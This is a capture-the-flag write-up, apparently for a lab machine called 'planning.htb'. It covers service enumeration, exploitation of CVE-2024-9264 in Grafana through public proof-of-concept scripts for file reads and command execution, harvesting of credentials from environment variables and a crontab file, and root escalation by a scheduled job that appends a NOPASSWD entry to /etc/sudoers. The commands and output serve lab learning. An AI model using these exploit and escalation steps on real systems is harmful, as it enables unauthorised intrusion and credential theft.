---
layout: post
title: "anotherMachine"
date: 2025-09-04
---

## Challenge Description
This was another Machine to pwn. Easier than the previous one.

## Solution

We are provided with these credentials: admin/0D5oT70Fq13EvB5r.

First of all lets run `nmap`:

`nmap 10.10.11.68`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 15:04 CEST
Nmap scan report for 10.10.11.68
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Now lets move to `dirsearch`:

`python dirsearch.py -u 10.10.11.68`
```
Target: http://10.10.11.68/

[15:06:26] Scanning:                                                                                                               
[15:06:27] 301 -   178B - /%2e%2e;/test  ->  http://planning.htb/%2E%2E;/test
[15:06:27] 301 -   178B - /%3f/  ->  http://planning.htb/%3F/               
[15:06:27] 301 -   178B - /%ff  ->  http://planning.htb/%FF                 
[15:06:30] 301 -   178B - /_  ->  http://planning.htb/_                     
[15:06:30] 301 -   178B - /a  ->  http://planning.htb/a                     
[15:06:30] 301 -   178B - /a%5c.aspx  ->  http://planning.htb/a%5C.aspx     
[15:06:30] 301 -   178B - /A  ->  http://planning.htb/A
[15:06:31] 301 -   178B - /admin/%3bindex/  ->  http://planning.htb/admin/%3Bindex/
[15:06:34] 301 -   178B - /b  ->  http://planning.htb/b                     
[15:06:37] 301 -   178B - /g  ->  http://planning.htb/g                     
[15:06:37] 301 -   178B - /h  ->  http://planning.htb/h                     
[15:06:38] 301 -   178B - /i  ->  http://planning.htb/i                     
[15:06:38] 301 -   178B - /in  ->  http://planning.htb/in                   
[15:06:38] 301 -   178B - /l  ->  http://planning.htb/l                     
[15:06:39] 301 -   178B - /login.wdm%2e  ->  http://planning.htb/login.wdm%2E
[15:06:40] 301 -   178B - /n  ->  http://planning.htb/n                     
[15:06:40] 301 -   178B - /p  ->  http://planning.htb/p                     
[15:06:41] 301 -   178B - /pl  ->  http://planning.htb/pl                   
[15:06:43] 301 -   178B - /t  ->  http://planning.htb/t                     
                                                                             
Task Completed 
```

In order to fix it and be able to resolve the correct address lets do this to `/etc/hosts`

`sudo nano /etc/hosts`

ADD this line to resolve the IP:

`10.10.11.68   planning.htb`

Now if we run again `dirsearch` we will see a different output:

`python dirsearch.py -u http://planning.htb`

```
Target: http://planning.htb/

[15:18:05] Scanning:                                                                                                               
[15:18:09] 200 -   12KB - /about.php                                        
[15:18:14] 200 -   10KB - /contact.php                                      
[15:18:14] 301 -   178B - /css  ->  http://planning.htb/css/                
[15:18:16] 301 -   178B - /img  ->  http://planning.htb/img/                
[15:18:17] 200 -   23KB - /index.php                                        
[15:18:17] 403 -   564B - /js/                                              
[15:18:17] 301 -   178B - /js  ->  http://planning.htb/js/                  
[15:18:17] 301 -   178B - /lib  ->  http://planning.htb/lib/                
[15:18:17] 403 -   564B - /lib/
                                                                             
Task Completed  
```
Lets also use gobuster for checking possible vhosts, it is important to use `--append-domain` to visualize the specific domains:

`gobuster vhost -u http://planning.htb -w /path/to/SecLists-master/Discovery/DNS/combined_subdomains.txt --append-domain -t 50`

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://planning.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /path/to/SecLists-master/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true                                                                                                          
===============================================================                                                                    
Starting gobuster in VHOST enumeration mode                                                                                        
===============================================================                                                                    
Found: grafana.planning.htb Status: 302 [Size: 29] [--> /login]
```

Lets add the vhost we found to `/etc/hosts` to resolve the IP as we did for `planning.htb`:

`sudo nano /etc/hosts`

`10.10.11.68   grafana.planning.htb`

Now we will visualize a login form and we can login with the credentials they provided us at the beginning. By retriving informations like the Grafana version which is running we can look online and see that its vulnerable to `CVE-2024-9264`.

Sources of POCs used:
``` 
https://github.com/nollium/CVE-2024-9264
https://github.com/z3k0sec/File-Read-CVE-2024-9264/
```

With the use of these POCs, lets print `/etc/passwd`:

`python poc.py --url http://grafana.planning.htb/ --user admin --password 0D5oT70Fq13EvB5r --file /etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
```

Lets check who we are exactly while running these commands:

`python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c whoami http://grafana.planning.htb`

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: whoami
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('whoami >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
root
```

Lets also see whats the structure of the directories:

`python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la" http://grafana.planning.htb`

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls -la
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('ls -la >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
total 1268
drwxr-xr-x  1 root    root    4096 Sep  2 15:26 .
drwxr-xr-x  1 root    root    4096 May 14  2024 ..
drwxrwxrwx  2 grafana root    4096 May 14  2024 .aws
-rw-------  1 root    root    1075 Sep  2 14:35 .bash_history
drwxr-xr-x  3 root    root    4096 Mar  1  2025 .duckdb
-rw-r--r--  1 root    root   34523 May 14  2024 LICENSE
-rwxr-xr-x  1 root    root 1188612 Sep  2  2025 abd.elf
drwxr-xr-x  2 root    root    4096 May 14  2024 bin
drwxr-xr-x  3 root    root    4096 May 14  2024 conf
-rw-r--r--  1 root    root    3711 Sep  2 08:52 payload
-rw-r--r--  1 root    root    2123 Sep  2 12:36 pl.pl
drwxr-xr-x 16 root    root    4096 May 14  2024 public
-rw-r--r--  1 root    root    2122 Sep  2 12:34 rev.pl
-rw-r--r--  1 root    root    2131 Sep  2 09:08 revshell.pl
-rw-r--r--  1 root    root    2131 Sep  2 09:08 revshell.pl.1
-rw-r--r--  1 root    root     216 Sep  2  2025 ryuk.sh
-rw-r--r--  1 root    root      54 Sep  2 11:32 shell.sh
-rw-r--r--  1 root    root      54 Sep  2 11:32 shell.sh.1
```

`python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls ../" http://grafana.planning.htb`

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls ../
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('ls ../ >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
adduser
apport
base-files
base-passwd
bash-completion
bug
ca-certificates
common-licenses
debconf
debianutils
dict
doc
doc-base
dpkg
gcc
gdb
grafana
info
keyrings
libc-bin
lintian
locale
man
menu
misc
pam
pam-configs
perl5
pixmaps
polkit-1
publicsuffix
sensible-utils
tabset
terminfo
zoneinfo
zoneinfo-icu
zsh
```

`python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la ../../" http://grafana.planning.htb`

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls -la ../../
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('ls -la ../../ >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
total 64
drwxr-xr-x 1 root root 4096 Apr 27  2024 .
drwxr-xr-x 1 root root 4096 Apr  4 10:23 ..
drwxr-xr-x 1 root root 4096 Sep  2 15:34 bin
drwxr-xr-x 2 root root 4096 Apr 18  2022 games
drwxr-xr-x 2 root root 4096 Apr 18  2022 include
drwxr-xr-x 1 root root 4096 May 14  2024 lib
drwxr-xr-x 2 root root 4096 Apr 27  2024 lib32
drwxr-xr-x 2 root root 4096 Apr 27  2024 lib64
drwxr-xr-x 4 root root 4096 Apr 27  2024 libexec
drwxr-xr-x 2 root root 4096 Apr 27  2024 libx32
drwxr-xr-x 1 root root 4096 Apr 27  2024 local
drwxr-xr-x 1 root root 4096 May 14  2024 sbin
drwxr-xr-x 1 root root 4096 May 14  2024 share
drwxr-xr-x 2 root root 4096 Apr 18  2022 src
```

`python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la ../../../" http://grafana.planning.htb`

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls -la ../../../
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('ls -la ../../../ >/tmp/grafana_cmd_output 2>&1 
|'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
total 72
drwxr-xr-x   1 root root 4096 Apr  4 10:23 .
drwxr-xr-x   1 root root 4096 Apr  4 10:23 ..
-rwxr-xr-x   1 root root    0 Apr  4 10:23 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 27  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 18  2022 boot
drwxr-xr-x   5 root root  340 Sep  2 04:01 dev
drwxr-xr-x   1 root root 4096 Sep  2 09:00 etc
drwxr-xr-x   1 root root 4096 Sep  2 09:00 home
lrwxrwxrwx   1 root root    7 Apr 27  2024 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr 27  2024 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Apr 27  2024 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Apr 27  2024 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Apr 27  2024 media
drwxr-xr-x   2 root root 4096 Apr 27  2024 mnt
drwxr-xr-x   2 root root 4096 Apr 27  2024 opt
dr-xr-xr-x 602 root root    0 Sep  2 04:01 proc
drwx------   1 root root 4096 Sep  2 09:05 root
drwxr-xr-x   5 root root 4096 Apr 27  2024 run
-rwxr-xr-x   1 root root 3306 May 14  2024 run.sh
lrwxrwxrwx   1 root root    8 Apr 27  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Apr 27  2024 srv
dr-xr-xr-x  13 root root    0 Sep  2 09:45 sys
drwxrwxrwt   1 root root 4096 Sep  2 15:59 tmp
drwxr-xr-x   1 root root 4096 Apr 27  2024 usr
drwxr-xr-x   1 root root 4096 Apr 27  2024 var
```

This line `-rwxr-xr-x   1 root root    0 Apr  4 10:23 .dockerenv` confirms us that we are running inside a Docker container.

`python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "ls -la ../../../usr/local/bin" http://grafana.planning.htb`

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: ls -la ../../../usr/local/bin
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('ls -la ../../../usr/local/bin 
>/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
total 48456
drwxr-xr-x 1 root root     4096 Feb 28  2025 .
drwxr-xr-x 1 root root     4096 Apr 27  2024 ..
-rwxr-xr-x 1 root root 49609088 Oct 14  2024 duckdb
```

This confirmed us what type of binaries are available to us. Since we located the `grafana.db` file. But unfortunately this doesn't seems to be the right path since we the pocs we are not able to access the database informations.


`python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "env" http://grafana.planning.htb`

```
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: env
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('env >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
GF_PATHS_HOME=/usr/share/grafana
HOSTNAME=7ce659d667d7
SHLVL=0
AWS_AUTH_EXTERNAL_ID=
HOME=/usr/share/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_LOGS=/var/log/grafana
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
AWS_AUTH_SESSION_DURATION=15m
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
PWD=/usr/share/grafana
```

We have found these two important informations:

```
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

Lets try to enstablish a connection through ssh.

`enzo@planning:~$ cat user.txt `

`c9d998fd6a8c5675ee8d4e9a9d1d4622`

And the user flag has been retrived! Now lets move to the root flag.

I initially tried to execute a reverse shell, but then i moved to checking the cronotabs folder if any process were running every X hours/minutes.

`cat /opt/crontabs/crontab.db`

```
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}   

{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}           
```

This tells us that the backup process is executed daily:
`"schedule":"@daily"`
Meanwhile the Cleanup is executed every minute:
`"schedule":"* * * * *"`.

But more important in the backup process we can see a password:

`P4ssw0rdS0pRi0T3c`

In this case it is used for zipping the backup file. But lets note it down because since these processes are executed by the root it might happen that this password might be used also for accessing as root.
Now lets see what type of binaries we are able to use. By running:

`enzo@planning:/$ ls -l /usr/bin/`

We can visualize all the binaries available to use and in the list we have `ss` and `netstat`. So lets look for some localhost services.

`enzo@planning:/$ ss -tupln`

Where:
```
-t TCP

-u UDP

-p processes

-l listening sockets

-n numeric
```

And this is the output:

```
Netid       State        Recv-Q       Send-Q               Local Address:Port                Peer Address:Port       Process       
udp         UNCONN       0            0                       127.0.0.54:53                       0.0.0.0:*                        
udp         UNCONN       0            0                    127.0.0.53%lo:53                       0.0.0.0:*                        
tcp         LISTEN       0            511                      127.0.0.1:8000                     0.0.0.0:*                        
tcp         LISTEN       0            4096                     127.0.0.1:3000                     0.0.0.0:*                        
tcp         LISTEN       0            4096                    127.0.0.54:53                       0.0.0.0:*                        
tcp         LISTEN       0            4096                     127.0.0.1:35403                    0.0.0.0:*                        
tcp         LISTEN       0            70                       127.0.0.1:33060                    0.0.0.0:*                        
tcp         LISTEN       0            511                        0.0.0.0:80                       0.0.0.0:*                        
tcp         LISTEN       0            151                      127.0.0.1:3306                     0.0.0.0:*                        
tcp         LISTEN       0            4096                 127.0.0.53%lo:53                       0.0.0.0:*                        
tcp         LISTEN       0            4096                             *:22                             *:*                    
```

We have a service at `127.0.0.1:8000`. It ask me for username and password. By using `root/P4ssw0rdS0pRi0T3c` I am able to access to the Cronotab UI.

Once logged in, We can see the two processes that were saved inside `/opt/crontabs/crontab.db`. So I decided to create a new job. And with this new job I want to give a power up to Enzo, so lets insert this:

`echo "enzo ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`

Save the job and lets run it. If we now try to execute the `sudo` command from Enzo ssh connection we will operate as root and we can easily retrive the root flag.

```
enzo@planning:/$ sudo -i
root@planning:~# ls
root.txt  scripts
root@planning:~# cat root.txt 
ac409d9615f0a65f9fee88bbd7000e59
```


